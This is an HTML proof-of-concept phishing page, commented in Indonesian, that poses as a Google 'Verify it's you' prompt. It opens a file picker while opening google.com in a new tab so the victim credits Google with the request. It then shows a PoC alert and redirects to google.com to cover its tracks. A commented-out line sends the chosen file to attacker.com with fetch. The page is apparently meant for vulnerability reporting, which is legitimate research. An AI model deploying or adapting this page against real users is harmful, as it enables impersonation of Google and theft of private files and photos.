<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Google Account Security</title>
    <style>
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }
      body {
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background: #f8f9fa;
        text-align: center;
      }
      .container {
        padding: 30px;
        max-width: 400px;
        background: white;
        border-radius: 8px;
      }
      .btn-ui {
        background: #1a73e8;
        color: white;
        padding: 10px 20px;
        border-radius: 4px;
        cursor: pointer;
        display: inline-block;
      }
      #fileSelect {
        display: none;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h1>Verify it's you</h1>
      <p>Tap to upload a verification photo.</p>
      <div class="btn-ui" id="triggerBtn">Continue to Google</div>
    </div>
    <input type="file" id="fileSelect" accept="image/*" />

    <script>
      const trigger = document.getElementById("triggerBtn");
      const fileInput = document.getElementById("fileSelect");

      trigger.onclick = (e) => {
        e.preventDefault();
        alert("System Action Required: Select a photo for verification.");
        // Buka file picker
        fileInput.click();
        // Buka tab baru ke Google.com (trusted domain)
        window.open("https://google.com", "_blank");
      };

      fileInput.onchange = () => {
        if (fileInput.files.length > 0) {
          const file = fileInput.files[0];
          // --- BUKTI EKSPLOITASI ---
          // Opsi 1: Tampilkan alert nama file (cukup untuk PoC)
          alert(
            "[PoC] File selected: " +
              file.name +
              ". This file would be sent to attacker server.",
          );
          // Opsi 2: Kirim file ke server attacker (simulasi dengan fetch)
          // const formData = new FormData();
          // formData.append('file', file);
          // fetch('https://attacker.com/upload', { method: 'POST', body: formData });

          // Setelah file dipilih, redirect halaman attacker ke halaman sukses (misal ke google.com lagi)
          // agar korban tidak perlu kembali ke halaman attacker.
          window.location.href = "https://www.google.com";
        }
      };
    </script>
  </body>
</html>
